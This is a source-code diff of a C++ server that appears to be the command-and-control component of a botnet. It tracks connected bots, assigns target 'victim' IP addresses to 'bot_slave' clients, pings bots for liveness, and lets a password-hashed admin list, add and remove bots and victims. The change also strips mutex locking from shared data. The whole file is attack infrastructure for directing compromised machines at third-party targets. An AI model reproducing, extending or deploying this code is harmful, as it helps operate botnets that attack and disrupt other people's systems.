@@ -1,5 +1,6 @@
 #include "server.h"
-#include <boost/range/algorithm.hpp>
+
+#include <utility>
 
 server::server(io::io_context& io_context, std::uint16_t port)
     : io_context_(io_context),
@@ -31,13 +32,15 @@ void server::start() {
 
 void server::accept() {
 	socket_.emplace(io_context_);
+
 	acceptor_.async_accept(*socket_, [self = this](err error_code) { self->onAccept(error_code); });
 }
 
 void server::onAccept(err error_code) {
-	size_t client_id = getClientId_();
+	int client_id = getClientId_();
+
 	clients_sessions_container_.insert(
-	    std::make_pair(client_id, std::unique_ptr<session>(new session(std::move(*socket_), io_context_, client_id))));
+	    std::make_pair(client_id, std::make_unique<session>(std::move(*socket_), io_context_, client_id)));
 	auto& client = clients_sessions_container_.find(client_id)->second;
 
 	PRINT("New client connected", "");
@@ -68,6 +71,8 @@ void server::handleAlive(std::string& command, std::vector<std::string>& params,
 	if (!params.size()) return;
 	if (!isNumber_(params[0])) return;
 	if (stoi(params[0])) client->inactive_timeout_count_ = 0;
+
+	PRINT("NUMBER OF CLIENTS: ", clients_sessions_container_.size());
 }
 
 void server::handleInit(std::string& command, std::vector<std::string>& params, session* client) {
@@ -95,34 +100,70 @@ void server::handleInit(std::string& command, std::vector<std::string>& params, 
 }
 
 void server::handleGetClientsData(std::string& command, std::vector<std::string>& params, session* client) {
-	if (!params.size()) return;
+	if (params.empty()) return;
 	if (!checkHash_(params[0])) return;
 
-	std::vector<std::string> output_params = {"5", "[IP-address]", "[Connected]", "[Messages]", "[Victims]", "[Status]"};
-	{
-		std::unique_lock<std::mutex> lock(clients_data_m_);
-		for (auto& bot : clients_data_container_) {
-			output_params.push_back(bot.first);
-			output_params.push_back(bot.second.connected);
-			output_params.push_back(std::to_string(bot.second.msgs_from));
-			output_params.push_back(std::to_string(bot.second.victims));
-			output_params.push_back(bot.second.status);
+	if (params.size() == 2) {
+		if (stoi(params[1]) && bots_data_output_.size() > 0) {
+			client->send(msg_parser_.genCommand(command, bots_data_output_.front()));
+			bots_data_output_.pop();
+			return;
 		}
 	}
-	client->send(msg_parser_.genCommand(command, output_params));
+	int bot_counter = 0;
+	int current_msg_block = 0;
+
+	// Clearing messages queue (for manager)
+	std::queue<std::vector<std::string>> empty;
+	std::swap(bots_data_output_, empty);
+
+	std::vector<std::string> msg;
+	std::vector<std::string> parameters = {"[IP-address]", "[Connected]", "[Messages]", "[Victims]", "[Role]"};
+
+	int msg_blocks_num = std::ceil((float)clients_data_container_.size() / MAX_NUMBER_OF_BOTS_DATA_PER_MSG);
+
+	for (auto& bot : clients_data_container_) {
+		if (bot_counter >= MAX_NUMBER_OF_BOTS_DATA_PER_MSG || !bot_counter) {
+			if (bot_counter) {
+				bots_data_output_.emplace(std::move(msg));
+				msg.clear();
+			}
+			bot_counter = 0;
+
+			msg.push_back(std::to_string(current_msg_block + 1));
+			msg.push_back(std::to_string(msg_blocks_num));
+			msg.push_back(std::to_string(parameters.size()));
+
+			msg.insert(msg.end(), parameters.begin(), parameters.end());
+
+			++current_msg_block;
+		}
+
+		msg.push_back(bot.first);
+		msg.push_back(bot.second.connected);
+		msg.push_back(std::to_string(bot.second.msgs_from));
+		msg.push_back(std::to_string(bot.second.victims));
+		msg.push_back(bot.second.status);
+
+		++bot_counter;
+	}
+	bots_data_output_.emplace(std::move(msg));
+
+	client->send(msg_parser_.genCommand(command, bots_data_output_.front()));
+	bots_data_output_.pop();
 }
 
 void server::handleGetVictimsData(std::string& command, std::vector<std::string>& params, session* client) {
 	if (!params.size()) return;
 	if (!checkHash_(params[0])) return;
 
-	std::vector<std::string> output_params = {"1", "[Active_Victims]"};
+	std::vector<std::string> output_params = {"1", "1", "1", "[Active_Victims]"};
 
 	for (auto& victim : victims_ips_) {
 		PRINT("VICTIMS: ", victim);
 		output_params.push_back(victim);
 	}
-
+	PRINT("SENT: ", msg_parser_.genCommand(command, output_params));
 	client->send(msg_parser_.genCommand(command, output_params));
 }
 
@@ -130,23 +171,20 @@ void server::handleRemoveClient(std::string& command, std::vector<std::string>& 
 	if (params.size() < 2) return;
 	if (!checkHash_(params[0])) return;
 
+	if (clients_data_container_.find(params[1]) == clients_data_container_.end()) {
+		return;
+	}
+
 	auto ip = params[1];
-	auto id = clients_data_container_.find(client->ip_)->second.id;
+	auto id = clients_data_container_.find(ip)->second.id;
 
 	PRINT("REMOVING CLIENT: ", ip);
-	{
-		std::unique_lock<std::mutex> lock(clients_session_m_);
-		if (clients_sessions_container_.find(id) != clients_sessions_container_.end()) {
-			// TODO:@mark fix bug when removing bot from hashmap
-			// clients_sessions_container_.erase(id);
-		}
+	if (clients_sessions_container_.find(id) != clients_sessions_container_.end()) {
+		clients_sessions_container_.find(id)->second->stop();
+		clients_sessions_container_.erase(id);
 	}
-	{
-		std::unique_lock<std::mutex> lock(clients_data_m_);
-		if (clients_data_container_.find(ip) != clients_data_container_.end()) {
-			// TODO:@mark fix same bug possibly
-			// clients_data_container_.erase(ip);
-		}
+	if (clients_data_container_.find(ip) != clients_data_container_.end()) {
+		clients_data_container_.erase(ip);
 	}
 }
 
@@ -161,12 +199,12 @@ void server::handleRemoveVictim(std::string& command, std::vector<std::string>& 
 		return;
 	}
 
-	size_t client_id_for_min_victims = -1;
-	std::string client_ip = "";
+	int client_id_for_min_victims = -1;
+	std::string client_ip;
 
 	for (const auto& cl : clients_data_container_) {
-
-		if (cl.second.status == "bot_slave" && std::find(cl.second.victims_vector.begin(), cl.second.victims_vector.end(), victim)!=cl.second.victims_vector.end()) {
+		if (cl.second.status == "bot_slave" && std::find(cl.second.victims_vector.begin(), cl.second.victims_vector.end(),
+								 victim) != cl.second.victims_vector.end()) {
 			client_id_for_min_victims = cl.second.id;
 			client_ip = cl.first;
 
@@ -195,7 +233,6 @@ void server::handleAddVictim(std::string& command, std::vector<std::string>& par
 
 	std::string victim_ip = params[1];
 
-
 	PRINT("ADDING NEW VICTIM: ", victim_ip);
 
 	if (is_valid_ip(victim_ip)) {
@@ -223,55 +260,63 @@ void server::handleAddVictim(std::string& command, std::vector<std::string>& par
 	} else {
 		PRINT("WRONG VICTIM IP: ", victim_ip);
 	}
-
 }
 
 void server::pingClients() {
 	std::string command = "[ARE_YOU_ALIVE]";
-	std::vector<std::pair<size_t, std::string>> inactive_clients;
-	{
-		std::unique_lock<std::mutex> lock_s(clients_session_m_);
-		std::unique_lock<std::mutex> lock_d(clients_data_m_);
-		for (auto& client : clients_sessions_container_) {
-			++client.second->inactive_timeout_count_;
-			if (client.second->inactive_timeout_count_ >= INACTIVE_COUNTER_MAX) {
-				PRINT("Disconnecting due to inactivity client:", client.second->ip_);
-				inactive_clients.push_back(std::make_pair(client.second->id_, client.second->ip_));
-			} else {
-				if (clients_data_container_.find(client.second->ip_) == clients_data_container_.end()) {
-					continue;
-				}
-				std::vector<std::string> output_params = {NONE_PARAMETERS};
-				client.second->send(msg_parser_.genCommand(command, output_params));
+	std::vector<std::pair<int, std::string>> inactive_bots;
+
+	for (auto& client : clients_sessions_container_) {
+		++client.second->inactive_timeout_count_;
+
+		if (client.second->inactive_timeout_count_ >= INACTIVE_COUNTER_MAX) {
+			if (!client.second->disconnected_) {
+				client.second->stop();
 			}
+
+			inactive_bots.emplace_back(std::make_pair(client.second->id_, client.second->ip_));
+
+		} else {
+			if (clients_data_container_.find(client.second->ip_) == clients_data_container_.end()) {
+				continue;
+			}
+			std::vector<std::string> output_params = {NONE_PARAMETERS};
+			client.second->send(msg_parser_.genCommand(command, output_params));
 		}
 	}
 
-	for (auto& client : inactive_clients) {
-		{
-			std::unique_lock<std::mutex> lock(clients_session_m_);
-			clients_sessions_container_.erase(client.first);
-		}
-		{
-			std::unique_lock<std::mutex> lock(clients_data_m_);
-			if (clients_data_container_.find(client.second) != clients_data_container_.end()) {
-				clients_data_container_.erase(client.second);
-			}
+	for (auto& bot : inactive_bots) {
+		clients_sessions_container_.erase(bot.first);
+		if (clients_data_container_.find(bot.second) != clients_data_container_.end()) {
+			clients_data_container_.erase(bot.second);
 		}
 	}
+
 	timer_.expires_at(timer_.expires_at() + interval_);
 	timer_.async_wait(boost::bind(&server::pingClients, this));
 }
 
-size_t server::getClientId_() {
-	std::hash<long int> hasher;
-	size_t id = hasher(
-	    std::chrono::duration_cast<std::chrono::milliseconds>(std::chrono::system_clock::now().time_since_epoch()).count());
-	return id;
+int server::getClientId_() {
+	std::random_device rd;
+	std::mt19937::result_type seed = rd() ^ ((std::mt19937::result_type)std::chrono::duration_cast<std::chrono::seconds>(
+						     std::chrono::system_clock::now().time_since_epoch())
+						     .count() +
+						 (std::mt19937::result_type)std::chrono::duration_cast<std::chrono::microseconds>(
+						     std::chrono::high_resolution_clock::now().time_since_epoch())
+						     .count());
+
+	std::mt19937 gen(seed);
+	std::uniform_int_distribution<unsigned> distrib(1, INT_MAX);
+
+	int bot_id = (int)distrib(gen);
+	while (clients_sessions_container_.find(bot_id) != clients_sessions_container_.end()) {
+		bot_id = (int)distrib(gen);
+	}
+	return bot_id;
 }
 
 bool server::checkHash_(std::string& pass) {
-	if (pass == "") return false;
+	if (pass.empty()) return false;
 	std::hash<std::string> hasher;
 	return hasher(pass) == admin_hash_;
 }
@@ -285,35 +330,26 @@ const std::string server::getCurrentDateTime_() {
 	return buf;
 }
 
-void server::updateMsgCounter_(session* client) {
-	std::unique_lock<std::mutex> lock(clients_data_m_);
-	++clients_data_container_[client->ip_].msgs_from;
-}
+void server::updateMsgCounter_(session* client) { ++clients_data_container_[client->ip_].msgs_from; }
 
 bool server::isNumber_(const std::string& s) { return !s.empty() && std::all_of(s.begin(), s.end(), ::isdigit); }
 
-
-
-bool server::valid_part(char* s)
-{
+bool server::valid_part(char* s) {
 	int n = strlen(s);
 
 	// if length of passed string is
 	// more than 3 then it is not valid
-	if (n > 3)
-		return false;
+	if (n > 3) return false;
 
 	// check if the string only contains digits
 	// if not then return false
 	for (int i = 0; i < n; i++)
-		if ((s[i] >= '0' && s[i] <= '9') == false)
-			return false;
+		if ((s[i] >= '0' && s[i] <= '9') == false) return false;
 	std::string str(s);
 
 	// if the string is "00" or "001" or
 	// "05" etc then it is not valid
-	if (str.find('0') == 0 && n > 1)
-		return false;
+	if (str.find('0') == 0 && n > 1) return false;
 	std::stringstream geek(str);
 	int x;
 	geek >> x;
@@ -325,12 +361,10 @@ bool server::valid_part(char* s)
 
 /* return 1 if IP string is
 valid, else return 0 */
-int server::is_valid_ip(std::string victim_ip)
-{
-
+int server::is_valid_ip(std::string victim_ip) {
 	int ctn = 0;
 
-	for (int i = 0; i<victim_ip.size(); i++) {
+	for (int i = 0; i < victim_ip.size(); i++) {
 		if (victim_ip.at(i) == ':') {
 			ctn += 1;
 		}
@@ -348,8 +382,7 @@ int server::is_valid_ip(std::string victim_ip)
 	}
 	std::cout << victim_ip_port_split[0] << " " << victim_ip_port_split[1] << "\n";
 	// if empty string then return false
-	if (victim_ip.empty())
-		return 0;
+	if (victim_ip.empty()) return 0;
 
 	for (char& c : victim_ip_port_split[1]) {
 		if (!std::isdigit(c)) {
@@ -371,33 +404,23 @@ int server::is_valid_ip(std::string victim_ip)
 	// string should be 3
 	// for it to be valid
 	for (int i = 0; i < len; i++)
-		if (victim_ip_ip[i] == '.')
-			count++;
-	if (count != 3)
-		return false;
+		if (victim_ip_ip[i] == '.') count++;
+	if (count != 3) return false;
 
-
-	char *dup = strdup(victim_ip_ip.c_str());
-	char *ptr = strtok(dup, ".");
-	if (ptr == NULL)
-		return 0;
+	char* dup = strdup(victim_ip_ip.c_str());
+	char* ptr = strtok(dup, ".");
+	if (ptr == NULL) return 0;
 
 	while (ptr) {
-
 		/* after parsing string, it must be valid */
-		if (valid_part(ptr))
-		{
+		if (valid_part(ptr)) {
 			/* parse remaining string */
 			ptr = strtok(NULL, ".");
-			if (ptr != NULL)
-				++dots;
-		}
-		else
+			if (ptr != NULL) ++dots;
+		} else
 			return 0;
 	}
 
-	if (dots != 3)
-		return 0;
+	if (dots != 3) return 0;
 	return 1;
 }
-
